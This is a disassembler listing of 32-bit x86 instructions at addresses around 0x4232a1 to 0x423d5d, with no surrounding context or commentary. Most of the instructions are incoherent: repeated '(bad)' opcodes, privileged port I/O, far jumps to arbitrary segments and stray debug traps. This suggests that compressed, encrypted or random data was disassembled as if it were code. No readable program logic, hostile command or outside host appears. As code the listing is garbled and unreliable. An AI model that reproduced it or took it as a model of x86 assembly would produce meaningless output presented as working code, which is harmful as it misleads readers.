  4232a1:	imul   edi,DWORD PTR [edi-0xe0c5771],0x868d81b5
  4232ab:	push   ebx
  4232ac:	pusha  
  4232ad:	or     dh,bh
  4232af:	(bad)  
  4232b0:	mov    eax,ds:0x81821a63
  4232b5:	or     ecx,ebp
  4232b7:	xor    cl,al
  4232b9:	out    dx,al
  4232ba:	cmp    DWORD PTR [ecx-0x65],ebp
  4232bd:	enter  0xfcba,0xab
  4232c1:	mov    ds:0xf0552415,eax
  4232c6:	ja     0x423299
  4232c8:	fnstenv [ecx]
  4232ca:	xchg   edx,eax
  4232cb:	jnp    0x42324f
  4232cd:	mov    dh,0x52
  4232cf:	xor    DWORD PTR [ebx+0x6684cc97],edx
  4232d5:	or     eax,0x3bbdbaea
  4232da:	mov    cs,WORD PTR [ecx-0x6]
  4232dd:	imul   esp,DWORD PTR ds:0xbf8a322,0x62e32657
  4232e7:	mov    ebp,0xf4c10f63
  4232ec:	dec    esp
  4232ed:	jb     0x4232ea
  4232ef:	ja     0x4232c1
  4232f1:	rol    DWORD PTR [ebx-0x26de3496],1
  4232f7:	sub    ebp,DWORD PTR [esi-0x7d757b55]
  4232fd:	(bad)  
  4232fe:	aaa    
  4232ff:	sub    BYTE PTR [esi-0x6d57fc57],dh
  423305:	adc    BYTE PTR [ebx+0x7b2b099b],al
  42330b:	stc    
  42330c:	mov    dh,0x2c
  42330e:	or     DWORD PTR [edx-0x3c],ebx
  423311:	or     DWORD PTR [ecx-0x4d],esi
  423314:	pushf  
  423315:	add    eax,0x672d152
  42331a:	outs   dx,BYTE PTR ds:[esi]
  42331b:	stos   BYTE PTR es:[edi],al
  42331c:	cmp    al,0x5d
  42331e:	xor    eax,0xd6b0f3a6
  423323:	pop    esp
  423324:	adc    DWORD PTR [ecx+0x2d],ebx
  423327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423328:	and    al,0xac
  42332a:	repz pop ebx
  42332c:	rol    DWORD PTR [esi-0x35b6f1bc],1
  423332:	or     eax,0xb31559ee
  423337:	and    BYTE PTR [eax-0x2e],al
  42333a:	mov    edx,0x4534e22f
  42333f:	cmc    
  423340:	leave  
  423341:	jle    0x423343
	...
  4233b3:	add    BYTE PTR [edx-0x7e],dl
  4233b6:	cs imul edi,esi,0x4bb57ed
  4233bd:	mov    eax,ds:0x242a8e4a
  4233c2:	out    dx,eax
  4233c3:	jl     0x423357
  4233c5:	js     0x4233c8
  4233c7:	add    dh,dh
  4233c9:	add    BYTE PTR [eax],al
  4233cb:	add    al,bh
  4233cd:	and    eax,0xd498c47d
  4233d2:	gs wrmsr 
  4233d5:	int3   
  4233d6:	out    0x7,al
  4233d8:	mov    al,0x87
  4233da:	jnp    0x42340b
  4233dc:	fcmovne st,st(3)
  4233de:	jecxz  0x4233da
  4233e0:	jo     0x423436
  4233e2:	jns    0x423458
  4233e4:	or     eax,0x89ca63f4
  4233e9:	xchg   edx,eax
  4233ea:	aam    0xee
  4233ec:	mov    al,dh
  4233ee:	leave  
  4233ef:	ret    
  4233f0:	dec    ebx
  4233f1:	adc    edx,DWORD PTR [eax+0x3a5706e5]
  4233f7:	jne    0x4233cc
  4233f9:	lds    edx,FWORD PTR [esi+0x350332cb]
  4233ff:	aaa    
  423400:	fisub  WORD PTR [edx+0x37]
  423403:	mov    ah,0xed
  423405:	dec    esi
  423406:	sub    ch,dh
  423408:	sub    BYTE PTR [edx],bl
  42340a:	mov    edx,0xfe23ae34
  42340f:	jecxz  0x42345d
  423411:	jb     0x4233a1
  423413:	add    cl,BYTE PTR [ebp-0x6a89bdeb]
  423419:	dec    ebp
  42341a:	imul   ebp,DWORD PTR [ecx-0x4d1fc044],0x4bf82289
  423424:	test   eax,0x279fe8a2
  423429:	dec    edx
  42342a:	add    ebx,DWORD PTR [esi-0x79]
  42342d:	sbb    al,0xa0
  42342f:	dec    eax
  423430:	enter  0x3ffd,0x82
  423434:	mov    ch,cl
  423436:	inc    ebx
  423437:	add    eax,0xffdfdadd
  42343c:	cwde   
  42343d:	add    eax,0xa4b0346
  423442:	imul   esi,esi,0x26
  423445:	icebp  
  423446:	push   edx
  423447:	ror    BYTE PTR [ecx],cl
  423449:	std    
  42344a:	cmp    BYTE PTR [edx],bh
  42344c:	jl     0x4233df
  42344e:	and    edi,DWORD PTR [edi]
  423450:	popa   
  423451:	and    edx,DWORD PTR [edi+0x50b8aef3]
  423457:	sbb    eax,0xeaa30ecd
  42345c:	rcr    DWORD PTR [edi],1
  42345e:	adc    ebp,DWORD PTR [ebx-0x49]
  423461:	into   
  423462:	xor    BYTE PTR [edx],bl
  423464:	xor    al,0x6d
  423466:	inc    esp
  423467:	out    dx,eax
  423468:	jns    0x4234da
  42346a:	fiadd  DWORD PTR [ebx+0x3569e484]
  423470:	push   ebp
  423471:	(bad)  
  423472:	xchg   edx,eax
  423473:	mov    dl,0xaf
  423475:	inc    ecx
  423476:	js     0x423406
  423478:	ror    DWORD PTR [esp+eax*8],1
  42347b:	or     esp,DWORD PTR [ebx+0x6aebac4a]
  423481:	cmp    al,0x88
  423483:	cld    
  423484:	pop    edx
  423485:	popf   
  423486:	int3   
  423487:	mov    gs,WORD PTR [eax]
  423489:	ds jp  0x4234f2
  42348c:	es cmp al,0x3e
  42348f:	in     eax,0x14
  423491:	dec    edi
  423492:	scas   al,BYTE PTR es:[edi]
  423493:	dec    ebp
  423494:	aad    0x4f
  423496:	and    ebx,eax
  423498:	ficomp WORD PTR [edx+0x3dddc32e]
  42349e:	retf   
  42349f:	jne    0x423426
  4234a1:	fist   WORD PTR ds:0x2db2dfab
  4234a7:	in     al,dx
  4234a8:	push   esi
  4234a9:	aas    
  4234aa:	ja     0x423481
  4234ac:	push   ebp
  4234ad:	xchg   esi,eax
  4234ae:	stos   BYTE PTR es:[edi],al
  4234af:	jmp    0x4234ed
  4234b1:	neg    DWORD PTR [ecx+0x1a]
  4234b4:	clc    
  4234b5:	xor    BYTE PTR [eax-0x37],dh
  4234b8:	shl    BYTE PTR [ecx],cl
  4234ba:	jbe    0x4234d0
  4234bc:	sbb    ch,bl
  4234be:	cmp    al,bl
  4234c0:	(bad)  
  4234c1:	push   es
	...
  423532:	add    BYTE PTR [eax],al
  423534:	call   0xfa77:0xbf778fae
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0xf5
  423541:	mov    ah,0x8b
  423543:	or     ecx,DWORD PTR [eax-0x9fffe87]
  423549:	add    BYTE PTR [eax],al
  42354b:	add    BYTE PTR [ebp+0x36],ch
  42354e:	scas   al,BYTE PTR es:[edi]
  42354f:	fadd   DWORD PTR [esi-0x3fc9456]
  423555:	or     bl,cl
  423557:	pop    ss
  423558:	push   eax
  423559:	adc    esi,DWORD PTR [ecx+0x46553914]
  42355f:	popf   
  423560:	mov    dh,0x35
  423562:	mov    bh,BYTE PTR [ecx-0x5]
  423565:	gs cdq 
  423567:	mov    WORD PTR [ecx],fs
  423569:	and    eax,0x211b18a5
  42356e:	out    0x6f,al
  423570:	sub    BYTE PTR [esi+0x45],ah
  423573:	aam    0xcd
  423575:	mov    dh,bl
  423577:	cld    
  423578:	icebp  
  423579:	sbb    DWORD PTR [esi-0x11],ebx
  42357c:	and    al,ch
  42357e:	jmp    0x33f1:0xe496211f
  423585:	clc    
  423586:	mov    esp,0xabc2fb82
  42358b:	xor    esp,DWORD PTR [edx+0x7c]
  42358e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42358f:	cli    
  423590:	ins    BYTE PTR es:[edi],dx
  423591:	in     eax,0xb5
  423593:	jbe    0x4235db
  423595:	ins    BYTE PTR es:[edi],dx
  423596:	adc    eax,0x6ab7ece5
  42359b:	test   ebx,0x703120c7
  4235a1:	add    BYTE PTR [eax+eiz*2-0x3e],al
  4235a5:	xor    al,0x85
  4235a7:	in     eax,0x56
  4235a9:	fs or  al,0xc0
  4235ac:	jmp    0x9b17:0x36d2d6f3
  4235b3:	push   es
  4235b4:	xchg   esi,eax
  4235b5:	and    BYTE PTR [esi],ch
  4235b7:	inc    ebp
  4235b8:	ret    
  4235b9:	inc    eax
  4235ba:	cdq    
  4235bb:	mov    dl,ch
  4235bd:	dec    ebp
  4235be:	aas    
  4235bf:	or     DWORD PTR ds:0x2de1a360,ebx
  4235c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235c6:	inc    esp
  4235c7:	int    0x1a
  4235c9:	mov    eax,ds:0xd3075ce1
  4235ce:	ja     0x42361f
  4235d0:	sbb    esp,DWORD PTR [edi+ebp*8+0x67]
  4235d4:	bswap  esi
  4235d6:	sbb    ebx,DWORD PTR [edi]
  4235d8:	push   edi
  4235d9:	jne    0x42359f
  4235db:	rcr    BYTE PTR [edi],0x81
  4235de:	sub    BYTE PTR [esp+eiz*8],ch
  4235e1:	retf   0x329d
  4235e4:	push   ecx
  4235e5:	test   ebp,esi
  4235e7:	enter  0x93db,0x8c
  4235eb:	ss (bad) 
  4235ef:	call   0xbde9050d
  4235f4:	je     0x423578
  4235f6:	add    ah,BYTE PTR [ecx-0x73]
  4235f9:	fnstcw WORD PTR [ebp+0x48]
  4235fc:	sar    DWORD PTR [esi+0x74],0xe3
  423600:	push   ebp
  423601:	push   ds
  423602:	mov    ebp,0x81813be0
  423607:	push   0x16d7df1
  42360c:	lock xchg DWORD PTR [ecx+0x3eb37be3],esi
  423613:	iret   
  423614:	sub    al,0x3
  423616:	xchg   ebp,eax
  423617:	lock fcom DWORD PTR [esi-0x33]
  42361b:	mov    eax,ds:0x9228b1e6
  423620:	imul   DWORD PTR cs:[ebp-0x4f]
  423624:	mov    al,ds:0xd79c90a2
  423629:	sub    DWORD PTR [ebx+0x1cb91372],ebp
  42362f:	dec    ebx
  423630:	ins    DWORD PTR es:[edi],dx
  423631:	imul   ecx,DWORD PTR [eax+0x5d],0xfffffff1
  423635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423636:	test   eax,0xf3d26d33
  42363b:	adc    DWORD PTR [ecx+0x33],ebx
  42363e:	int3   
  42363f:	and    DWORD PTR [esi-0x47],edi
	...
  4236b2:	add    BYTE PTR [eax],al
  4236b4:	daa    
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm3,QWORD PTR [edi+0x6b]
  4236c2:	mov    bh,0x44
  4236c4:	jle    0x423740
  4236c6:	add    DWORD PTR [eax],eax
  4236c8:	test   BYTE PTR [eax],0x0
  4236cb:	add    BYTE PTR [edx],dl
  4236cd:	inc    ebp
  4236ce:	adc    eax,0x6e5192a2
  4236d3:	xor    BYTE PTR [esi+ebx*8+0x6e],bh
  4236d7:	out    0x3c,eax
  4236d9:	ror    esi,cl
  4236db:	es aas 
  4236dd:	push   esp
  4236de:	out    0x37,al
  4236e0:	ins    DWORD PTR es:[edi],dx
  4236e1:	repnz cmp al,0xe2
  4236e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236e5:	imul   esi,DWORD PTR [esi+ebp*1+0x91f9660],0x694a9aa4
  4236f0:	sbb    DWORD PTR [ebx],esi
  4236f2:	int3   
  4236f3:	xor    eax,DWORD PTR [esi-0x1a]
  4236f6:	pusha  
  4236f7:	mov    eax,0x60efea54
  4236fc:	iret   
  4236fd:	rol    DWORD PTR [ebp-0x7e1869df],cl
  423703:	pop    edx
  423704:	nop
  423705:	adc    ecx,DWORD PTR [edi-0xa1fd84]
  42370b:	dec    ebx
  42370c:	je     0x42374b
  42370e:	adc    al,0xcf
  423710:	push   ss
  423711:	adc    eax,0x239e5514
  423716:	or     bl,BYTE PTR [eax+esi*8+0x7]
  42371a:	cmp    ebx,DWORD PTR [eax]
  42371c:	mov    bh,0x1b
  42371e:	rcl    DWORD PTR [si+0x6312],0x17
  423724:	add    eax,0x858b6808
  423729:	in     al,dx
  42372a:	out    dx,eax
  42372b:	imul   BYTE PTR ds:0xf7abeb2a
  423731:	xabort 0x32
  423734:	popa   
  423735:	jo     0x42372f
  423737:	sub    esi,esp
  423739:	idiv   DWORD PTR [ebx+edi*1+0x1e]
  42373d:	push   0x87ce9874
  423742:	and    dh,dl
  423744:	push   esi
  423745:	je     0x42373b
  423747:	push   0xffffffae
  423749:	mov    edi,0xae999b3d
  42374e:	pop    ebx
  42374f:	es xor ch,bl
  423752:	pop    ss
  423753:	push   ecx
  423754:	cld    
  423755:	(bad)  
  423756:	loope  0x423701
  423758:	ja     0x4237b5
  42375a:	mov    dh,0xad
  42375c:	push   edx
  42375d:	mov    ds:0xe89a4e82,eax
  423762:	inc    ecx
  423763:	outs   dx,DWORD PTR ds:[esi]
  423764:	daa    
  423765:	mov    WORD PTR [edi-0x3a0aff33],?
  42376b:	out    dx,al
  42376c:	repz or ah,BYTE PTR [ecx-0x50a9bd5e]
  423773:	(bad)  
  423774:	mov    ebx,0xde129130
  423779:	cwde   
  42377a:	sub    esi,DWORD PTR [edx-0x6]
  42377d:	mov    ebp,0xb0c9eb3a
  423782:	or     ebp,ebp
  423784:	out    0x49,al
  423786:	inc    edx
  423787:	fadd   st,st(5)
  423789:	mov    al,ds:0x41d240cb
  42378e:	imul   edi,esp,0xffffffbd
  423791:	mov    ebx,0x896f4f54
  423796:	stc    
  423797:	adc    eax,0x84622c11
  42379c:	add    edx,DWORD PTR ds:0x32324ff3
  4237a2:	aas    
  4237a3:	jl     0x423823
  4237a5:	aas    
  4237a6:	adc    ah,BYTE PTR [edx]
  4237a8:	shl    DWORD PTR [edx-0x61c0fc],1
  4237ae:	inc    ecx
  4237af:	(bad)  [esi]
  4237b1:	cmp    al,0xdd
  4237b3:	call   0xe23d:0x889a7f84
  4237ba:	fwait
  4237bb:	stos   DWORD PTR es:[edi],eax
  4237bc:	outs   dx,DWORD PTR ds:[esi]
  4237bd:	(bad)  
  4237be:	(bad)  
  4237bf:	nop
  4237c0:	popa   
  4237c1:	rol    BYTE PTR [eax],0x0
	...
  423834:	int    0x39
  423836:	mov    eax,0xef97fc97
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	sub    ebx,0x70
  423843:	inc    esp
  423844:	je     0x4238c1
  423846:	add    DWORD PTR [eax],eax
  423848:	test   BYTE PTR [eax],0x0
  42384b:	add    BYTE PTR [eax+0x699e6d0a],dh
  423851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423852:	retf   0xf3ed
  423855:	sbb    eax,0x2bdd61a6
  42385a:	aas    
  42385b:	cmp    ch,0x4f
  42385e:	and    DWORD PTR [ebx],ebp
  423860:	push   0x308c6c80
  423865:	and    DWORD PTR [edi+0x74],ebp
  423868:	or     BYTE PTR [esi-0x34],cl
  42386b:	ja     0x4238b8
  42386d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42386e:	jg     0x423823
  423870:	ret    0x44df
  423873:	int    0x63
  423875:	cli    
  423876:	arpl   WORD PTR [esi+0x6d],bp
  423879:	data16 and ch,BYTE PTR es:[edi]
  42387d:	mov    eax,DWORD PTR [edx+0x73]
  423880:	not    DWORD PTR [eax+0x22]
  423883:	sar    BYTE PTR [esi+0x578cf0ed],cl
  423889:	loopne 0x423859
  42388b:	fidiv  DWORD PTR [edi+0x50cc33de]
  423891:	mov    bl,0x85
  423893:	mov    bl,0xa5
  423895:	aad    0xf9
  423897:	fnstsw WORD PTR [ebx-0x4]
  42389a:	mov    ebx,0xc63ac876
  42389f:	or     ah,BYTE PTR [ebx-0x3]
  4238a2:	pop    ss
  4238a3:	adc    eax,eax
  4238a5:	dec    ecx
  4238a6:	xchg   DWORD PTR [eax],edi
  4238a8:	cld    
  4238a9:	mov    dl,0xd
  4238ab:	mov    eax,0x57efdb62
  4238b0:	xor    eax,DWORD PTR [ecx-0xa]
  4238b3:	(bad)  
  4238b4:	jnp    0x4238d7
  4238b6:	je     0x4238c7
  4238b8:	ins    DWORD PTR es:[edi],dx
  4238b9:	xchg   cx,ax
  4238bb:	dec    ebp
  4238bc:	mov    eax,0x11a1e84b
  4238c1:	pop    ds
  4238c2:	movups xmm3,XMMWORD PTR [ebp-0x76]
  4238c6:	xacquire xchg BYTE PTR [eax-0x4],ch
  4238ca:	mov    dh,0xa2
  4238cc:	(bad)  
  4238cd:	(bad)  
  4238ce:	mov    eax,0xf6eafbfd
  4238d3:	or     ah,BYTE PTR [edi-0x13c6131d]
  4238d9:	mov    ds:0x38712505,eax
  4238de:	ins    BYTE PTR es:[edi],dx
  4238df:	xor    eax,0xbe40bc29
  4238e4:	sub    al,0x9b
  4238e6:	rcr    DWORD PTR [ebx-0x22],cl
  4238e9:	sbb    BYTE PTR [edx+0xf723797],al
  4238ef:	xor    eax,0xf80780ed
  4238f4:	add    DWORD PTR [edi+0x5f64f886],ebp
  4238fa:	sub    ecx,DWORD PTR [ebp-0x1b]
  4238fd:	xchg   edx,eax
  4238fe:	pop    eax
  4238ff:	sbb    ch,BYTE PTR [ebp+0x16]
  423902:	adc    al,0xc8
  423904:	aaa    
  423905:	jg     0x4238bc
  423907:	addr16 shr esi,cl
  42390a:	ret    
  42390b:	sbb    DWORD PTR [esi],edi
  42390d:	stc    
  42390e:	push   0x68
  423910:	jne    0x4238af
  423912:	adc    BYTE PTR [edi-0x48d0aea6],ah
  423918:	test   DWORD PTR [edi+0x34],eax
  42391b:	out    0xeb,al
  42391d:	sbb    BYTE PTR [edi-0x53dae445],dh
  423923:	stc    
  423924:	mov    WORD PTR [eax-0x11],fs
  423927:	push   0x2b480f32
  42392c:	add    DWORD PTR [ebp-0x7892bfb9],0x3f
  423933:	dec    ebx
  423934:	inc    eax
  423935:	(bad)  
  423936:	dec    eax
  423937:	push   edi
  423938:	or     BYTE PTR [esi+edx*2],ch
  42393b:	in     al,0xb6
  42393d:	jmp    0x4238ff
  42393f:	mov    gs,WORD PTR [edx]
  423941:	push   esi
	...
  4239b2:	add    BYTE PTR [eax],al
  4239b4:	xchg   esi,eax
  4239b5:	push   0x18
  4239b7:	mov    ah,bh
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [ecx+0x6aaf064d],?
  4239c5:	jl     0x4239c8
  4239c7:	add    dh,dh
  4239c9:	add    BYTE PTR [eax],al
  4239cb:	add    BYTE PTR [esi],bh
  4239cd:	pop    ebp
  4239ce:	xlat   BYTE PTR ds:[ebx]
  4239cf:	nop
  4239d0:	das    
  4239d1:	add    BYTE PTR [ecx+0x27],dh
  4239d4:	mov    bh,0xaf
  4239d6:	imul   esp,DWORD PTR [eax+esi*2-0x5f],0xdea05a7e
  4239de:	dec    edi
  4239df:	mov    eax,ds:0xee68a5c2
  4239e4:	xlat   BYTE PTR ds:[ebx]
  4239e5:	(bad)  
  4239e6:	ins    BYTE PTR es:[edi],dx
  4239e7:	jecxz  0x423a05
  4239e9:	pushf  
  4239ea:	or     eax,DWORD PTR es:[ebx]
  4239ed:	mov    BYTE PTR [ebx+0x5d8a7d72],dl
  4239f3:	xchg   ebp,eax
  4239f4:	cdq    
  4239f5:	(bad)  [ebx+eax*8-0x51]
  4239f9:	cmp    al,BYTE PTR [ecx]
  4239fb:	adc    eax,0xd29fbf32
  423a00:	ret    
  423a01:	inc    esp
  423a02:	stos   BYTE PTR es:[edi],al
  423a03:	sti    
  423a04:	out    0x93,al
  423a06:	jle    0x423a14
  423a08:	mov    ebp,0x16da433
  423a0d:	dec    eax
  423a0e:	in     al,0x7b
  423a10:	jp     0x423a7a
  423a12:	scas   al,BYTE PTR es:[edi]
  423a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a14:	mov    bh,0x7d
  423a16:	je     0x423a30
  423a18:	mov    ds:0x6f3e6680,eax
  423a1d:	xchg   esi,eax
  423a1e:	pop    ds
  423a1f:	sub    al,0x93
  423a21:	cmp    DWORD PTR [ebp+0x78434e2],eax
  423a27:	fucomi st,st(0)
  423a29:	int    0x39
  423a2b:	icebp  
  423a2c:	cmp    BYTE PTR [edx],al
  423a2e:	jae    0x4239b6
  423a30:	je     0x4239e8
  423a32:	pop    ecx
  423a33:	mov    ebx,0xeefbb12e
  423a38:	and    al,0xd2
  423a3a:	lock rcl BYTE PTR [edx],cl
  423a3d:	dec    edx
  423a3e:	mov    dh,0x64
  423a40:	mov    al,0xb6
  423a42:	loopne 0x423a33
  423a44:	push   ds
  423a45:	mov    ecx,0x80935e59
  423a4a:	test   DWORD PTR [ebx],ebx
  423a4c:	and    ebp,ecx
  423a4e:	mov    ebp,0x35a00b36
  423a53:	sbb    BYTE PTR [esi+0x41d423f7],0xb9
  423a5a:	sahf   
  423a5b:	jp     0x4c5b45d9
  423a61:	or     al,0xe0
  423a63:	jbe    0x423adf
  423a65:	and    BYTE PTR [edi],bl
  423a67:	pushf  
  423a68:	leave  
  423a69:	push   0x6d
  423a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a6c:	scas   al,BYTE PTR es:[edi]
  423a6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a6e:	sahf   
  423a6f:	push   ds
  423a70:	in     eax,dx
  423a71:	rol    DWORD PTR cs:[ebx-0x316fb1b5],0x6f
  423a79:	mov    edx,0xcd6e81c
  423a7e:	push   ds
  423a7f:	dec    esp
  423a80:	jmp    0xa44ed643
  423a85:	(bad)  
  423a86:	ret    0x3946
  423a89:	ds push ecx
  423a8b:	(bad)  
  423a8c:	repz xchg edi,eax
  423a8e:	sub    ecx,edx
  423a90:	pop    edi
  423a91:	xchg   ecx,eax
  423a92:	inc    edi
  423a93:	mov    bh,0xb6
  423a95:	hlt    
  423a96:	adc    BYTE PTR [esi+0x18dd0011],bh
  423a9c:	sbb    DWORD PTR [ecx-0x6e1ea18e],edx
  423aa2:	inc    ebp
  423aa3:	imul   ecx,DWORD PTR [eax],0xffffffce
  423aa6:	mov    ebx,0x31562a81
  423aab:	cli    
  423aac:	pushf  
  423aad:	repz and DWORD PTR gs:[edx+0x45],eax
  423ab2:	jle    0x423ae1
  423ab4:	jne    0x423a45
  423ab6:	and    eax,DWORD PTR [eax]
  423ab8:	xor    DWORD PTR ds:0x7d8f22f8,0xabdb28a5
	...
  423b32:	add    BYTE PTR [eax],al
  423b34:	inc    esp
  423b35:	aaa    
  423b36:	dec    edx
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0xc7
  423b41:	jle    0x423b39
  423b43:	imul   esp,DWORD PTR [eax+0x7d],0x1
  423b47:	add    dh,dh
  423b49:	add    BYTE PTR [eax],al
  423b4b:	add    BYTE PTR [ecx+0x6bc77093],ah
  423b51:	cmc    
  423b52:	jle    0x423b34
  423b54:	xchg   edi,eax
  423b55:	mov    ds:0xd3152896,al
  423b5a:	push   ecx
  423b5b:	test   DWORD PTR [eax],esp
  423b5d:	push   cs
  423b5e:	les    ebx,FWORD PTR [edx]
  423b60:	repz (bad) 
  423b62:	xor    dl,dl
  423b64:	les    ebp,FWORD PTR [ecx+0x2b]
  423b67:	pushf  
  423b68:	sbb    eax,0xc207c4e2
  423b6d:	pop    ebx
  423b6e:	sbb    eax,0x2f436465
  423b73:	mov    WORD PTR [ebp+0x65],es
  423b76:	fisttp QWORD PTR [ebp+eiz*1-0x7b]
  423b7a:	adc    esi,0xffffffce
  423b7d:	cmp    dh,dl
  423b7f:	out    dx,eax
  423b80:	inc    ebp
  423b81:	leave  
  423b82:	aaa    
  423b83:	scas   eax,DWORD PTR es:[di]
  423b85:	and    al,0x73
  423b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b88:	imul   ebp,edi,0xffffffc5
  423b8b:	call   0xe5aa:0xd74eb4d7
  423b92:	xchg   DWORD PTR [eax-0x1c],ecx
  423b95:	(bad)  
  423b96:	cmc    
  423b97:	pop    eax
  423b98:	mov    DWORD PTR [ecx+0x66],esi
  423b9b:	jg     0x423bdf
  423b9d:	dec    ebx
  423b9e:	inc    edi
  423b9f:	cmp    esi,DWORD PTR [esi]
  423ba1:	inc    edx
  423ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ba3:	daa    
  423ba4:	push   ebp
  423ba5:	cmp    BYTE PTR [esp+eax*8-0x26],dl
  423ba9:	retf   0x9664
  423bac:	lahf   
  423bad:	xor    al,0x7f
  423baf:	mov    al,0x6a
  423bb1:	xchg   esi,eax
  423bb2:	sub    ebp,DWORD PTR [edx]
  423bb4:	call   FWORD PTR [edx]
  423bb6:	pop    esi
  423bb7:	(bad)  
  423bb8:	imul   ecx,DWORD PTR [ecx-0x48],0x3
  423bbc:	pop    ecx
  423bbd:	lea    esp,[ecx]
  423bbf:	mov    al,0xf1
  423bc1:	(bad)  
  423bc2:	dec    ebx
  423bc3:	or     al,0x9c
  423bc5:	retf   
  423bc6:	mov    dh,0xc2
  423bc8:	mov    esp,DWORD PTR [edi-0x5b]
  423bcb:	daa    
  423bcc:	mov    dh,0x90
  423bce:	xchg   ecx,ecx
  423bd0:	push   ecx
  423bd1:	imul   ecx,DWORD PTR [edx],0x20
  423bd4:	fisubr WORD PTR [edi-0x43b8e6d0]
  423bda:	xor    DWORD PTR [eax],esi
  423bdc:	dec    ecx
  423bdd:	int    0xfb
  423bdf:	stos   BYTE PTR es:[edi],al
  423be0:	mov    cl,0x15
  423be2:	jb     0x423beb
  423be4:	repz mov edx,0xf007eea4
  423bea:	jno    0x423bc8
  423bec:	pop    ecx
  423bed:	and    BYTE PTR [ebp-0x1db4a625],bl
  423bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bf5:	add    eax,0xe98eb89b
  423bfa:	push   ebx
  423bfc:	leave  
  423bfd:	pop    ebx
  423bfe:	loope  0x423c51
  423c00:	and    DWORD PTR [edi],edi
  423c02:	cmp    esp,DWORD PTR [edx-0x620fc00b]
  423c08:	loopne 0x423c4e
  423c0a:	shl    dh,1
  423c0c:	(bad)  
  423c0d:	retf   0x7f37
  423c10:	or     al,0x8f
  423c12:	fcmovb st,st(2)
  423c14:	jmp    0x423c65
  423c16:	repz pop eax
  423c18:	cs (bad) 
  423c1a:	jl     0x423c9b
  423c1c:	stos   DWORD PTR es:[edi],eax
  423c1d:	mov    esp,0xaed570dc
  423c22:	cs push esi
  423c24:	push   edi
  423c25:	sub    BYTE PTR [eax-0x6a4ee210],0x22
  423c2c:	push   ds
  423c2d:	aas    
  423c2e:	addr16 cmc 
  423c30:	fmulp  st(4),st
  423c32:	fld    DWORD PTR [edi]
  423c34:	mov    bl,0xbc
  423c36:	mov    ds:0xa31e1dd2,al
  423c3b:	jecxz  0x423bef
  423c3d:	ins    DWORD PTR es:[edi],dx
  423c3e:	xchg   bl,dh
  423c40:	bound  esi,QWORD PTR [esi+0x0]
	...
  423cb2:	add    BYTE PTR [eax],al
  423cb4:	mov    edi,0x626d60bd
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0x4939,0x49
  423cc3:	or     dl,BYTE PTR [esi+0x7e]
  423cc6:	add    DWORD PTR [eax],eax
  423cc8:	test   BYTE PTR [eax],0x0
  423ccb:	add    BYTE PTR [ecx],ch
  423ccd:	cmp    eax,0xf91728d
  423cd2:	outs   dx,DWORD PTR ds:[esi]
  423cd3:	dec    esp
  423cd4:	mov    ecx,0x89541a84
  423cd9:	xchg   ecx,eax
  423cda:	scas   al,BYTE PTR es:[edi]
  423cdb:	sub    al,0x1a
  423cdd:	fst    DWORD PTR [eax-0x156b4f95]
  423ce3:	fstp   DWORD PTR [esi+0xbbdfe29]
  423ce9:	out    dx,al
  423cea:	es inc edi
  423cec:	jmp    0x97d3:0xf1a1745b
  423cf3:	fwait
  423cf4:	idiv   ah
  423cf6:	outs   dx,BYTE PTR ds:[esi]
  423cf7:	jns    0x423d6b
  423cf9:	push   ecx
  423cfa:	inc    ebp
  423cfb:	push   ds
  423cfc:	xor    eax,0xf2b5538f
  423d01:	cdq    
  423d02:	mov    ds:0xdd290920,eax
  423d07:	add    DWORD PTR [ebx+ebx*4+0x46],esp
  423d0b:	jg     0x423d19
  423d0d:	ja     0x423d09
  423d0f:	clc    
  423d10:	push   ebp
  423d11:	or     BYTE PTR [eax],dl
  423d13:	in     eax,0xd
  423d15:	scas   al,BYTE PTR es:[edi]
  423d16:	aam    0xb7
  423d18:	jb     0x423d0f
  423d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d1b:	popa   
  423d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d1d:	in     eax,0x6a
  423d1f:	dec    ebx
  423d20:	add    al,0x35
  423d22:	pop    ebp
  423d23:	ds mov bl,0x10
  423d26:	(bad)  
  423d27:	mov    ebp,0x560cd502
  423d2c:	xchg   BYTE PTR [eax+0x78],bl
  423d2f:	xor    ecx,0x2b
  423d32:	pop    esi
  423d33:	retf   
  423d34:	arpl   WORD PTR [ebx-0x2a],di
  423d37:	mov    ch,0xe0
  423d39:	std    
  423d3a:	push   0xc30c25bd
  423d3f:	lock add eax,0x1054c255
  423d45:	retf   0x2294
  423d48:	inc    ecx
  423d49:	ins    DWORD PTR es:[edi],dx
  423d4a:	push   esp
  423d4b:	loope  0x423d14
  423d4d:	(bad)  
  423d4e:	std    
  423d4f:	xchg   ebx,eax
  423d50:	cs jne 0x423cd6
  423d53:	inc    eax
  423d54:	xchg   edx,eax
  423d55:	aam    0xf
  423d57:	mov    ebx,0x9915f4c2
  423d5c:	inc    edi
  423d5d:	call   0x6ecd:0x2764b7ff
